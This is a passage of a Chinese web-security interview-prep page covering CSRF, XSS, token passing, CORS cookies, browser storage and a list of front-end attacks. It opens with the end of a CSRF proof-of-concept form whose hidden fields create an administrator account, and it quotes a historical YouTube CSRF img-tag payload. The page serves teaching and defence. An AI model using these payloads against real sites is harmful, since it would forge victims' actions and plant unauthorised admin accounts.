<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>first_name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>admin2@admin.com<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>last_name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>url<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>pass1<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>pass2<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>role<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>administrator<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>createuser<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Add+New+User+<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="youtube的csrf漏洞"><a href="#youtube的csrf漏洞" class="header-anchor">#</a> YouTube的CSRF漏洞</h3> <p>2008年，有安全研究人员发现，YouTube上几乎所有用户可以操作的动作都存在CSRF漏洞。如果攻击者已经将视频添加到用户的“Favorites”，那么他就能将他自己添加到用户的“Friend”或者“Family”列表，以用户的身份发送任意的消息，将视频标记为不宜的，自动通过用户的联系人来共享一个视频。例如，要把视频添加到用户的“Favorites”，攻击者只需在任何站点上嵌入如下所示的IMG标签：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://youtube.com/watch_ajax?action_add_favorite_playlist=1&amp;video_
id=[VIDEO ID]&amp;playlist_id=&amp;add_to_favorite=1&amp;show=1&amp;button=AddvideoasFavorite<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>攻击者也许已经利用了该漏洞来提高视频的流行度。例如，将一个视频添加到足够多用户的“Favorites”，YouTube就会把该视频作为“Top  Favorites”来显示。除提高一个视频的流行度之外，攻击者还可以导致用户在毫不知情的情况下将一个视频标记为“不宜的”，从而导致YouTube删除该视频。</p> <p>这些攻击还可能已被用于侵犯用户隐私。YouTube允许用户只让朋友或亲属观看某些视频。这些攻击会导致攻击者将其添加为一个用户的“Friend”或“Family”列表，这样他们就能够访问所有原本只限于好友和亲属表中的用户观看的私人的视频。</p> <p>攻击者还可以通过用户的所有联系人名单（“Friends”、“Family”等等）来共享一个视频，“共享”就意味着发送一个视频的链接给他们，当然还可以选择附加消息。这条消息中的链接已经并不是真正意义上的视频链接，而是一个具有攻击性的网站链接，用户很有可能会点击这个链接，这便使得该种攻击能够进行病毒式的传播。</p> <h2 id="_8-黑客是怎么去利用cookie的-这个请求到底是怎么构造的"><a href="#_8-黑客是怎么去利用cookie的-这个请求到底是怎么构造的" class="header-anchor">#</a> 8 黑客是怎么去利用cookie的？这个请求到底是怎么构造的？</h2> <p>XSS攻击</p> <p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全</p> <p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p> <p><strong>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</strong></p> <p>不仅仅是业务上的“用户的 UGC 内容”（用户生成内容，即用户原创内容）可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p> <ul><li>来自用户的 UGC 信息</li> <li>来自第三方的链接</li> <li>URL 参数</li> <li>POST 参数</li> <li>Referer （可能来自不可信的来源）</li> <li>Cookie （可能来自其他子域注入）</li></ul> <h2 id="_9-http请求中option主要是干什么的"><a href="#_9-http请求中option主要是干什么的" class="header-anchor">#</a> 9 http请求中option主要是干什么的</h2> <p>OPTIONS请求方法的主要用途有两个：</p> <p>1、获取服务器支持的HTTP请求方法；也是黑客经常使用的方法。</p> <p>2、用来检查服务器的性能。例如：AJAX进行跨域请求时的预检，需要向另外一个域名的资源发送一个HTTP OPTIONS请求头，用以判断实际发送的请求是否安全。</p> <p>3、检测到请求方法是options，不会有与服务器的数据交互。</p> <h2 id="_10-xss的原理和防御措施-讲了加强cookie-过滤输入-过滤输出"><a href="#_10-xss的原理和防御措施-讲了加强cookie-过滤输入-过滤输出" class="header-anchor">#</a> 10 xss的原理和防御措施（讲了加强cookie，过滤输入，过滤输出）</h2> <h2 id="_11-csrf了解过吗-它的攻击流程是怎样的-如何防御-referer可不可以被修改、token可不可以被窃取-既然有漏洞那不是白做了"><a href="#_11-csrf了解过吗-它的攻击流程是怎样的-如何防御-referer可不可以被修改、token可不可以被窃取-既然有漏洞那不是白做了" class="header-anchor">#</a> 11 CSRF了解过吗，它的攻击流程是怎样的，如何防御（referer可不可以被修改、token可不可以被窃取，既然有漏洞那不是白做了）</h2> <h3 id="什么是csrf"><a href="#什么是csrf" class="header-anchor">#</a> 什么是CSRF</h3> <p>CSRF（Cross-site request  forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。<font color="red" size="3">利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</font>(<font color="orange" size="3">token不会被窃取，只会被冒用</font>)</p> <p>一个典型的CSRF攻击有着如下的流程：</p> <ul><li>受害者登录a.com，并保留了登录凭证（Cookie）。</li> <li>攻击者引诱受害者访问了b.com。</li> <li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</li> <li>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li> <li>a.com以受害者的名义执行了act=xx。</li> <li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</li></ul> <p>CSRF 攻击场景，可见B站点需要补充一些安全措施来防御这种攻击。<font color="red" size="3">增加Referer头字段校验是其中一种方法，（防盗链）</font>Referer 是浏览器自动添加的头字段，值一般是发送请求页面的origin(协议+域名)，该字段无法人工添加和修改，B站点服务器可以通过<strong>检验该字段是否在配置的白名单之内</strong>，来限制那些伪造的请求</p> <p><code>Referer</code>头部的内容为空的情况：</p> <ul><li>浏览器内直接输入URL</li> <li>Windows桌面的超链接图标</li> <li>浏览器内书签</li> <li>第三方软件内容中的链接跳入</li></ul> <h2 id="_12-关于token前后端传递以及涉及到的cookie跨域问题"><a href="#_12-关于token前后端传递以及涉及到的cookie跨域问题" class="header-anchor">#</a> 12 关于Token前后端传递以及涉及到的cookie跨域问题</h2> <h3 id="服务端端返回"><a href="#服务端端返回" class="header-anchor">#</a> 服务端端返回</h3> <p>用户输入账号和密码登录后，服务端会通过加密或者其他逻辑，生成一串标示用户身份的令牌字符串，它就是Token，并返回客户端。</p> <p>前端获取到后，可以手动存到浏览器的cookie或者localStorage中。</p> <h3 id="前端携带"><a href="#前端携带" class="header-anchor">#</a> 前端携带</h3> <p>登录后，接下来前端在页面的http请求，有些需要让服务端知道你是谁，那么就需要在请求接口时，带上之前存的Token。</p> <p>那么下面看看传递的方式有哪些：</p> <h4 id="_1-通过url参数传递"><a href="#_1-通过url参数传递" class="header-anchor">#</a> 1.通过url参数传递</h4> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code>//网络请求函数：
function () {
    //...
    <span class="token key attr-name">let token</span> <span class="token punctuation">=</span> <span class="token value attr-value">Utils.getCookie(Const.TOKEN);</span>
    <span class="token key attr-name">url +</span><span class="token punctuation">=</span> <span class="token value attr-value">`?_security_token=${token}`;</span>
    return ajax(url, payload);
}
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16eedb47e70ac408~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <h4 id="_2-通过form-data参数传递"><a href="#_2-通过form-data参数传递" class="header-anchor">#</a> 2.通过Form Data参数传递</h4> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code>function (params) {
            <span class="token key attr-name">params.opts</span> <span class="token punctuation">=</span> <span class="token value attr-value">params.opts || {};</span>
            // 可以做一些token之类的操作
            if (store.getters.getToken) {
                <span class="token key attr-name">params.opts.token</span> <span class="token punctuation">=</span> <span class="token value attr-value">store.getters.getToken || '';</span>
            }
            //...
            return ajax(url, payload);
        };
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16eedd08c53f3c4d~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <h4 id="_3-通过http-request-headers-头部传入到服务器"><a href="#_3-通过http-request-headers-头部传入到服务器" class="header-anchor">#</a> 3.通过HTTP Request Headers 头部传入到服务器</h4> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//axios的处理</span>
axios<span class="token operator">.</span>interceptors<span class="token operator">.</span>request<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span>config <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token constant">token</span> <span class="token operator">=</span> Cookie<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_security_token'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">Cookie</span><span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_security_token_inc'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
  config<span class="token operator">.</span>headers<span class="token operator">.</span>common<span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;Security-Token&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> token<span class="token punctuation">;</span>
  <span class="token keyword">return</span> config<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//或者自己的网络库</span>
<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//...</span>
    <span class="token keyword">return</span> <span class="token function">ajax</span><span class="token punctuation">(</span>host <span class="token operator">+</span> params<span class="token operator">.</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>
                data<span class="token punctuation">:</span> params<span class="token operator">.</span>opts<span class="token punctuation">,</span>
                <span class="token argument-name">method</span><span class="token punctuation">:</span> params<span class="token operator">.</span>method<span class="token punctuation">,</span>
                contentType<span class="token punctuation">,</span>
                <span class="token argument-name">headers</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>_security_token<span class="token punctuation">:</span> <span class="token string single-quoted-string">'02_zMKe_99eah5s0G1'</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16eedb389854424d~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <h4 id="_4-通过cookie-这里就要涉及跨域问题啦"><a href="#_4-通过cookie-这里就要涉及跨域问题啦" class="header-anchor">#</a> 4.通过Cookie（这里就要涉及跨域问题啦）</h4> <h5 id="_1-同域"><a href="#_1-同域" class="header-anchor">#</a> （1）同域</h5> <p>如果客户端发送的http请求是同域的，那很easy，<strong>浏览器</strong>会<strong>自动</strong>帮我们把<strong>同域</strong>下的cookie添加到请求的<strong>request header</strong>中<strong>Cookie字段</strong>中，服务端就会从接收到的request header中提取cookie中的token</p> <p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/10/16eee78c7ce99d41~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <h5 id="_2-跨域"><a href="#_2-跨域" class="header-anchor">#</a> （2）跨域</h5> <ul><li><strong>CORS</strong></li></ul> <p>如果此时你想到的是用CORS解决跨域问题，该如何解决呢？</p> <p>一般我们可能会简单粗暴地让服务端将Access-Control-Allow-Origin设为*，但此处没那么简单。</p> <p>这里需要<strong>三部曲</strong>：</p> <p>因为<strong>CORS请求默认不发送Cookie和HTTP认证信息</strong>，所以如果要把Cookie发到服务器，前后端需要一起配置：</p> <p><strong>前端</strong>需要在ajax请求中<strong>将withCredentials设为true</strong>，表示允许浏览器携带身份凭证，发送Cookie：</p> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code><span class="token key attr-name">var xhr</span> <span class="token punctuation">=</span> <span class="token value attr-value">new XMLHttpRequest();</span>
<span class="token key attr-name">xhr.withCredentials</span> <span class="token punctuation">=</span> <span class="token value attr-value">true;</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>同时<strong>服务端</strong>需要设置<strong>同意发送Cookie</strong>：</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code><span class="token key atrule">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>最后要注意的是，<strong>服务端的Access-Control-Allow-Origin不能设为星号</strong>，只能设为<strong>请求的来源域</strong>，否则前面的设置都无效。因为设置星号情况下，浏览器是不会发送cookie的。</p> <p>CORS部分参考<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2016%2F04%2Fcors.html" target="_blank" rel="noopener noreferrer">阮一峰老师的跨域资源共享 CORS 详解<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ul><li><strong>Nginx反向代理</strong></li></ul> <p>知道通过配置代理可以解决cookie跨域的问题，但是还没有亲自尝试过，自己只是在纯粹跨域的问题中用过代理解决。</p> <p>比如用vue开发时，在config 文件夹下的 index.js 文件中配置proxyTable属性即可。</p> <div class="language-arduino line-numbers-mode"><pre class="language-arduino"><code>proxyTable<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token char">'/'</span><span class="token operator">:</span><span class="token punctuation">{</span>
        target<span class="token operator">:</span><span class="token char">'http://xxx.xxx.xxx'</span><span class="token punctuation">,</span><span class="token comment">//目标接口域名</span>
        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token comment">//是否跨域</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>作用就是将本地域名的一个请求代理到了目标接口域名下，转发请求。</p> <p>后面实践过会把此处补上。</p> <ul><li><strong>不同端口下的cookie</strong></li></ul> <p>不同端口下的cookie可以共享吗？</p> <p>之前以为cookie完全遵循同源策略，是有跨域限制的，必须协议、域名、端口三个都满足，实践证明它与端口是无关的，只和域名有关，cookie的跨域可以理解为跨域名。其实稍微想一下就可以得出这个答案，因为cookie有一个domain属性，它就是设置域名的，并不涉及到端口，只要二级域名相同，那么就是共享的。</p> <p>我开启了localhost下8081和8082端口下的两个项目，在8082下设置了一个cookie，发现在8081端口下也共享了这个cookie</p> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code><span class="token key attr-name">document.cookie</span> <span class="token punctuation">=</span> <span class="token value attr-value">&quot;name=oeschger&quot;;</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/17162a88e2d1311d~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/17162a8deb12b82e~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <h2 id="_13-csrf-token能存储在cookie里吗"><a href="#_13-csrf-token能存储在cookie里吗" class="header-anchor">#</a> 13 csrf token能存储在cookie里吗？</h2> <p>csrf就是冒用cookie的，最好别存在cookie里，</p> <p>如果一定要存，其实是可以的，只要服务端不要去从cookie里面取csrf token就行</p> <h2 id="_14-sessionstorage-与-localstorage-有何区别"><a href="#_14-sessionstorage-与-localstorage-有何区别" class="header-anchor">#</a> 14 sessionStorage 与 localStorage 有何区别</h2> <p>localStorage 生命周期是永久除非自主清除 sessionStorage 生命周期为当前窗口或标签页，关闭窗口或标签页则会清除数据</p> <p>他们均只能存储字符串类型的对象</p> <p>不同浏览器无法共享 localStorage 或 sessionStorage 中的信息。<strong>相同浏览器的不同页面间可以共享相同的  localStorage（页面属于相同域名和端口），但是不同页面或标签页间无法共享 sessionStorage  的信息</strong>。这里需要注意的是，页面及标 签页仅指顶级窗口，如果一个标签页包含多个 iframe 标签且他们属于同源页面，那么他们之间是可以共享  sessionStorage 的</p> <h2 id="_15-重点-前端攻击-点击劫持"><a href="#_15-重点-前端攻击-点击劫持" class="header-anchor">#</a> 15(重点)前端攻击：点击劫持</h2> <img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/image-20230222123511352.png" alt="image-20230222123511352" style="zoom:67%;"> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/image-20230222123711698.png" alt="image-20230222123711698"></p> <h2 id="_16-重点-ddos"><a href="#_16-重点-ddos" class="header-anchor">#</a> 16 （重点）DDoS</h2> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/image-20230222123916405.png" alt="image-20230222123916405"></p> <h2 id="_17-重点-sql注入"><a href="#_17-重点-sql注入" class="header-anchor">#</a> 17 （重点）SQL注入</h2> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/image-20230222124009372.png" alt="image-20230222124009372"></p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/docs/面经/腾讯面经/计算机网络.html" class="prev">
        计算机网络
      </a></span> <span class="next"><a href="/docs/面经/腾讯面经/浏览器工作原理.html">
        浏览器工作原理
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/docs/assets/js/app.9351438b.js" defer></script><script src="/docs/assets/js/2.4eec09cd.js" defer></script><script src="/docs/assets/js/1159.eacf13d7.js" defer></script>
  </body>
</html>
